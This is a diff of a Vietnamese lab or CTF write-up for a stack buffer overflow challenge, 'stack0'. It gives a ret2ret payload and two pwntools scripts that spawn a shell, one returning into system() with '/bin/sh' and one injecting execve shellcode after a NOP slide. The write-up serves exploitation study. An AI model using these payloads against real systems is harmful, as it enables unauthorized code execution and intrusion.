@@ -19,7 +19,7 @@ t thấy chương trình dùng gets để nhập input vào `[esp+0x1c]`. Sau đ
 
 ### Ret2ret
 
-Ta có thể overflow sang EIP để jump về `0x08048419`. Ban đầu mình tính padding = 64+4+4 = 72 nhưng ko exploit đc. Nên sau đó mình dùng Gdb để có đc địa chỉ của ESP,EBP.
+Ta có thể overflow sang EIP để jump về `0x08048419`. Mình dùng Gdb để có đc địa chỉ của ESP,EBP.
 
 ![ebp-esp](ebp-esp.png)
 
@@ -27,3 +27,56 @@ Ta có thể overflow sang EIP để jump về `0x08048419`. Ban đầu mình t�
 payload: `python -c 'print "a"*80 + "\x19\x84\x04\x08"' | ./stack0`
 ![ret2ret](ret2ret.png)
 
+## Spawn Shell
+
+### return về hàm system()
+
+thay vì để jump về `0x08048419` ta có thể return về hàm system() để spawn shell.
+![shell](shell.png)
+
+```python
+#!/usr/bin/python3
+from pwn import *
+elf = context.binary = ELF('./stack0')
+rop = ROP(elf)
+
+#system() address
+system_addr = 0xf7e11790
+info('system_addr: ' + hex(system_addr))
+#/bin/sh address
+sh_addr = 0xf7dd0000+ 0x18e363 #base address + offset
+info('sh_addr: ' + hex(sh_addr))
+padding = 80*b'b' #padding tính từ phần trên
+payload = padding + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)
+
+p = process('./stack0')
+p.sendline(payload)
+p.interactive()
+```
+
+![shell2](shell2.png)
+
+#### cách2
+
+Check qua phân vùng stack, mình thấy nó có quyền excute. Nên mình sẽ inject shellcode vào stack.
+```python
+#!/usr/bin/python3
+from pwn import *
+elf = context.binary = ELF('./stack0')
+rop = ROP(elf)
+
+padding = b'a'*80
+eip = p32(0xffffd250+100) # esp addr + offset nop_slide
+
+nop_slide = b"\x90"*400
+
+shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+
+payload = padding + eip + nop_slide + shellcode
+
+p = process('./stack0')
+p.sendline(payload)
+p.interactive()
+```
+
+![shell3](shell3.png)
